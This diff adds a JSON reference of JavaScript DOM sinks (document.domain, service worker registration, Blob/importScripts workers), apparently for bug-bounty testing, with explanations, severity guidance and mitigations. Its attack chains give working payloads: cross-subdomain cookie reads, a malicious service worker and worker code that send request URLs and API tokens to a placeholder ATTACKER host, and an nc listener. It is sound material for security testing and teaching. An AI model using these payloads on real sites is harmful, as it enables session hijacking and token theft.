@@ -1,0 +1,281 @@
+{
+  "category": "misc",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-document-domain",
+      "name": "document.domain",
+      "category": "misc",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "document.domain",
+        "document.domain =",
+        "domain="
+      ],
+      "severity": "P2",
+      "severity_note": "P2/P3 when a concrete sibling-subdomain attack surface exists (subdomain takeover, stored XSS on any sibling, user-content subdomain); informational when the relaxation is set but no sibling vector is shown; the setter is disabled by default in recent Chrome, so browser-matrix evidence is mandatory.",
+      "explain": "Assigning document.domain shortens the page's origin to a parent suffix, opting two frames on sibling subdomains into mutual scripting. If app.TARGET relaxes to TARGET, any attacker-controlled or compromised page on any sibling subdomain gains full DOM access to the app, and a tainted assignment value can force the relaxation itself.",
+      "how_it_works": "Same-origin policy normally isolates subdomains. When both pages set document.domain to the same parent suffix, the browser treats them as same-origin: each can read the other's DOM, cookies visible to that origin scope, and storage. The setter only shortens (you cannot set an unrelated domain), and recent Chrome ignores it unless the site opts out of origin-keyed agent clusters via the Origin-Agent-Cluster header.",
+      "why_it_matters": "It multiplies the blast radius of every sibling-subdomain weakness: a forgotten wiki, a user-content host, or a subdomain takeover instantly becomes origin-wide session theft on the main app. It is the quiet mechanism behind 'XSS on any subdomain equals XSS on all subdomains'.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "dom-form-values",
+        "window.name"
+      ],
+      "chains": [
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Confirm both sides relax to the same suffix",
+              "payload": "no payload; reconnaissance step",
+              "command": "curl -s 'https://app.TARGET/' | grep -n 'document.domain'",
+              "indicator": "the app page sets document.domain to the parent suffix (for example the registrable root of TARGET)"
+            },
+            {
+              "action": "Stage the sibling attacker page",
+              "payload": "document.domain='TARGET';var f=document.createElement('iframe');f.src='https://app.TARGET/account';f.onload=function(){alert(f.contentDocument.cookie)};document.body.appendChild(f)",
+              "command": "host the payload on a sibling subdomain you control (or via stored XSS on any sibling host) and open it in a browser logged in to app.TARGET as YOUR_ACCOUNT",
+              "indicator": "the alert shows the app.TARGET session cookie read across subdomains through the relaxed boundary"
+            },
+            {
+              "action": "Record the browser matrix",
+              "payload": "same payload as the previous step",
+              "command": "repeat the test in current Chrome and in Firefox",
+              "indicator": "Firefox executes the cross-subdomain read; recent Chrome ignores document.domain by default unless the app sends Origin-Agent-Cluster: ?0, so capture which engines are affected"
+            }
+          ],
+          "eligibility": "Accepted when a real sibling attack surface exists (subdomain takeover, stored XSS on any sibling, user-content subdomain). Reporting 'document.domain is set' with no sibling vector is triaged as informational; chain it to a concrete sibling and it lands at P2/P3."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm a tainted value feeds the setter",
+              "payload": "?d=TARGET",
+              "command": "curl -s 'https://app.TARGET/?d=TARGET' | grep -n 'document.domain'",
+              "indicator": "the served JavaScript assigns the d parameter (or a value derived from it) to document.domain"
+            },
+            {
+              "action": "Force the relaxation in a live session",
+              "payload": "?d=TARGET",
+              "command": "open 'https://app.TARGET/?d=TARGET' in a browser and run 'document.domain' in the console",
+              "indicator": "the console shows document.domain now equals the attacker-chosen suffix, enabling the sibling-subdomain attack from the previous chain"
+            }
+          ],
+          "eligibility": "A tainted document.domain assignment alone is a gadget; programs pay for the demonstrated cross-subdomain access it enables, not the gadget. Present both halves or expect an informational grade."
+        }
+      ],
+      "contexts": {
+        "js-string": "the assigned value must be a parent suffix of the current host; anything else throws a SecurityError",
+        "subdomain": "the attack surface is every sibling subdomain of the relaxed suffix, including forgotten and user-content hosts",
+        "browser-matrix": "recent Chrome disables the setter by default (origin-keyed agent clusters); Firefox and Safari still honor it"
+      },
+      "waf_notes": "No network request carries the document.domain assignment, so WAFs are blind to it. The server-side signal to grep for is the Origin-Agent-Cluster response header: its absence on Chrome-targeted apps is what keeps the relaxation alive there. Try tainted values that are suffixes only; unrelated domains throw immediately.",
+      "eligibility": "Two honest gates: (1) a concrete sibling vector must exist, and (2) the executing browser must still honor the setter. With both, cross-subdomain session theft is a solid P2/P3; missing either, the finding is informational hardening advice.",
+      "mitigations": [
+        "Remove document.domain usage and switch cross-frame communication to postMessage with strict origin checks",
+        "Send Origin-Agent-Cluster: ?1 so modern Chrome cannot be opted into relaxation",
+        "Host user content and legacy apps on a separate registrable domain",
+        "Audit all subdomains for takeover and stored-XSS exposure before any relaxation"
+      ],
+      "related": [
+        "window.open",
+        "iframe src",
+        "document.cookie"
+      ],
+      "references": [
+        "MDN: document.domain",
+        "PortSwigger: DOM-based vulnerabilities",
+        "OWASP WSTG: Testing for DOM-based XSS"
+      ]
+    },
+    {
+      "id": "sink-service-worker-register",
+      "name": "serviceWorker.register",
+      "category": "misc",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "serviceWorker.register",
+        "navigator.serviceWorker.register",
+        "serviceWorker",
+        "register('sw"
+      ],
+      "severity": "P2",
+      "severity_note": "A hijacked service worker is a persistent MITM for every page under its scope (P1/P2); in practice the script URL must be same-origin, so exploitation needs a same-origin JS-hosting gadget (upload, JSONP, path confusion), and without one the finding is theoretical (P4/P5).",
+      "explain": "navigator.serviceWorker.register(url, {scope}) installs a background proxy that intercepts every fetch under its scope, surviving page reloads. If the script URL or the scope is attacker-influenced, and any same-origin endpoint serves attacker JavaScript with a JS MIME type, the attacker gains a persistent man-in-the-middle inside the TARGET origin.",
+      "how_it_works": "Browsers require the worker script to be same-origin, HTTPS-served, and JavaScript-typed; the scope must be at or below the script's path unless the server sends a Service-Worker-Allowed header. Once active, the worker sees and can rewrite every request and response in scope, including authenticated API calls, and it persists across sessions until unregistered.",
+      "why_it_matters": "This is the most persistent client-side compromise available: one successful registration outlives the tab, the reload, and often the session. It converts a one-shot reflected input into an always-on interception layer that exfiltrates API tokens and rewrites pages indefinitely.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "localStorage",
+        "dom-form-values"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches register()",
+              "payload": "?sw=/jlf-trace.js",
+              "command": "open 'https://TARGET/app?sw=/jlf-trace.js' in a browser, then open DevTools > Application > Service Workers",
+              "indicator": "a registration attempt for /jlf-trace.js appears (a 404 or MIME error proves the parameter drives the registration)"
+            },
+            {
+              "action": "Find a same-origin gadget serving attacker JS",
+              "payload": "?sw=/uploads/YOUR_ACCOUNT/sw.js",
+              "command": "curl -s -I 'https://TARGET/uploads/YOUR_ACCOUNT/sw.js' | grep -i 'content-type'",
+              "indicator": "the response content-type is application/javascript or text/javascript and the body is the script YOUR_ACCOUNT uploaded"
+            },
+            {
+              "action": "Register the interceptor and prove persistence",
+              "payload": "sw.js containing self.addEventListener('fetch',function(e){fetch('https://ATTACKER/log?u='+encodeURIComponent(e.request.url))})",
+              "command": "open 'https://TARGET/app?sw=/uploads/YOUR_ACCOUNT/sw.js' to register, then browse the app in a fresh tab",
+              "indicator": "the ATTACKER log fills with same-origin request URLs from the fresh tab and the Service Workers panel shows the malicious worker activated"
+            }
+          ],
+          "eligibility": "The script must be same-origin with a JS MIME type, so a tainted register() without a hosting gadget is not exploitable and gets triaged down to P4/P5; with an upload or JSONP gadget it is rated as persistent XSS-equivalent (P1/P2)."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Confirm the scope option is attacker-influenced",
+              "payload": "?scope=/",
+              "command": "curl -s 'https://TARGET/app?scope=/' | grep -n 'serviceWorker.register'",
+              "indicator": "the served JavaScript passes the scope parameter into the register() options object"
+            },
+            {
+              "action": "Widen the legitimate worker's scope",
+              "payload": "?scope=/",
+              "command": "open 'https://TARGET/app?scope=/' in a browser, then run navigator.serviceWorker.getRegistrations().then(function(r){console.log(r.map(function(x){return x.scope}))}) in the console",
+              "indicator": "the registered scope is the whole origin instead of the intended /app/ path, meaning the worker now intercepts every route"
+            }
+          ],
+          "eligibility": "Scope widening only matters combined with a compromised worker script; on its own it is informational. Note that browsers reject scopes above the script path unless the server sends a Service-Worker-Allowed header, so record that header."
+        }
+      ],
+      "contexts": {
+        "js-string": "both the script URL and the scope option are injection points; path confusion ('?sw=/../uploads/x.js') escapes forced prefixes on some stacks",
+        "same-origin": "the hard requirement is a same-origin URL serving attacker-controlled JavaScript with a JS MIME type",
+        "persistence": "the worker survives reloads and tabs; cleanup requires an explicit unregister or the site's own update logic"
+      },
+      "waf_notes": "Server WAFs see only a fetch of a .js URL and cannot distinguish a malicious registration. Upload defenses that matter are MIME-based: X-Content-Type-Options: nosniff and Content-Disposition: attachment on user files kill the gadget. JSONP endpoints with unfiltered callback names are the other classic JS-hosting gadget.",
+      "eligibility": "Severity is binary on the gadget: demonstrable same-origin attacker-JS URL plus tainted register() is persistent MITM and pays like XSS (P1/P2); without the gadget it is a theoretical hardening note. Show the active worker in DevTools as proof.",
+      "mitigations": [
+        "Never take the register() URL or scope from user input",
+        "Serve uploads from a separate domain with nosniff and Content-Disposition: attachment",
+        "Restrict JSONP callbacks to identifier characters only",
+        "Send a restrictive Service-Worker-Allowed header and audit registered scopes"
+      ],
+      "related": [
+        "dynamic Worker code",
+        "localStorage",
+        "iframe src"
+      ],
+      "references": [
+        "MDN: ServiceWorkerContainer.register()",
+        "HackTricks: Service Workers",
+        "OWASP: HTML5 Security Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-dynamic-worker-code",
+      "name": "dynamic Worker code",
+      "category": "misc",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "new Blob([",
+        "createObjectURL",
+        "importScripts(data:",
+        "Worker(URL.createObjectURL"
+      ],
+      "severity": "P3",
+      "severity_note": "Code execution in a worker context: no DOM, but credentialed fetch, IndexedDB access, and a postMessage bridge back to the page make it near-XSS (P3, P2 with demonstrated token theft); it is also a CSP escape hatch when worker-src allows blob: or data:.",
+      "explain": "Worker source assembled at runtime from strings (Blob plus URL.createObjectURL, data: URLs, or source text passed into importScripts) turns any tainted chunk into executed JavaScript inside a worker. It is eval with extra steps: no DOM, but full access to credentialed fetch, IndexedDB, and messaging with the page.",
+      "how_it_works": "A Blob worker inherits the creator's origin, so its fetches carry the session and its IndexedDB is the app's database. Because the payload travels as a string inside postMessage data or the fragment, HTML sanitizers and server WAFs never inspect it. CSP is the only real gate, and policies with worker-src blob: or data: reopen the hole even when script-src is tight.",
+      "why_it_matters": "Apps adopt dynamic workers for plugin systems, sandboxed user code, and off-thread computation, and each adopts an eval-grade trust decision under a less-audited name. A tainted worker also bypasses CSP configurations that were specifically hardened against inline script.",
+      "exploitable_when": [
+        "postMessage-data",
+        "location.hash",
+        "URLSearchParams",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm message data reaches the worker source",
+              "payload": "window.postMessage({code:'jlf-trace'},'*')",
+              "command": "open 'https://TARGET/tool' in a browser and run the payload in the console, then inspect DevTools > Sources for blob: workers",
+              "indicator": "a blob: worker exists whose source contains the traced value jlf-trace"
+            },
+            {
+              "action": "Execute attacker code in the worker",
+              "payload": "window.postMessage({code:\"postMessage('pwn');fetch('https://ATTACKER/log?i=hit')\"},'*')",
+              "command": "run the payload in the console of 'https://TARGET/tool' with an ATTACKER listener running 'nc -lvnp 8080'",
+              "indicator": "the listener logs the fetch from the worker and the page console receives the worker's postMessage('pwn')"
+            },
+            {
+              "action": "Steal data through the worker's credentialed fetch",
+              "payload": "window.postMessage({code:\"fetch('/api/token',{credentials:'include'}).then(function(r){return r.text()}).then(function(t){fetch('https://ATTACKER/log?t='+encodeURIComponent(t))})\"},'*')",
+              "command": "run the payload in the console and watch the ATTACKER listener",
+              "indicator": "the listener receives the API token fetched with the victim session's credentials"
+            }
+          ],
+          "eligibility": "Tainted worker code is script execution and is accepted like DOM XSS; triagers may ask for impact beyond alert(), which the credentialed-fetch step supplies. If the message path requires the victim to paste code themselves it is self-XSS and usually not eligible."
+        },
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the hash feeds an importScripts call",
+              "payload": "#u=https://ATTACKER/x.js",
+              "command": "open 'https://TARGET/tool#u=https://ATTACKER/x.js' in a browser with DevTools Network open",
+              "indicator": "the Network tab shows the worker fetching x.js from ATTACKER, proving the hash reaches importScripts"
+            },
+            {
+              "action": "Serve the worker payload cross-origin",
+              "payload": "x.js on ATTACKER contains postMessage('pwn-'+Date.now()) and is served with Access-Control-Allow-Origin: *",
+              "command": "host x.js with permissive CORS on ATTACKER and reload 'https://TARGET/tool#u=https://ATTACKER/x.js'",
+              "indicator": "the page console receives the worker's pwn message, proving cross-origin script execution; without the CORS header the import fails, so record the header requirement"
+            }
+          ],
+          "eligibility": "importScripts is subject to CORS for cross-origin scripts, so the attacker script must send Access-Control-Allow-Origin; state this in the PoC. The chain is accepted as code execution when it fires in the victim's origin context."
+        }
+      ],
+      "contexts": {
+        "js-string": "worker source is a plain string, so the same rules as eval apply to every concatenation",
+        "blob-url": "blob: workers inherit the creator origin; their fetches carry credentials and their IndexedDB is the app's",
+        "csp": "governed by worker-src (falling back to script-src); blob: or data: in those directives re-enables the technique against a hardened script-src"
+      },
+      "waf_notes": "Payloads live inside JavaScript strings, so HTML and attribute filters never see them; fragment and postMessage delivery keep the server WAF blind. CSP is the only meaningful control, and a policy that tightens script-src but leaves worker-src at blob: is the classic misconfiguration to test.",
+      "eligibility": "Verdict tracks eval: demonstrated code execution in the victim's origin is accepted (P3, P2 with token theft), self-pasted code is self-XSS and rejected, and a CSP that blocks blob:/data: workers kills the technique entirely, which must be ruled out first.",
+      "mitigations": [
+        "Never concatenate user input into worker source code",
+        "Set CSP worker-src 'self' and remove blob: and data: from script-src and worker-src",
+        "Build workers from fixed templates with allowlisted parameters instead of raw strings",
+        "Validate and schema-check any message before it influences code construction"
+      ],
+      "related": [
+        "serviceWorker.register",
+        "iframe srcdoc",
+        "javascript: URL"
+      ],
+      "references": [
+        "MDN: Web Workers API",
+        "OWASP: DOM based XSS Prevention Cheat Sheet",
+        "PortSwigger: DOM XSS"
+      ]
+    }
+  ]
+}
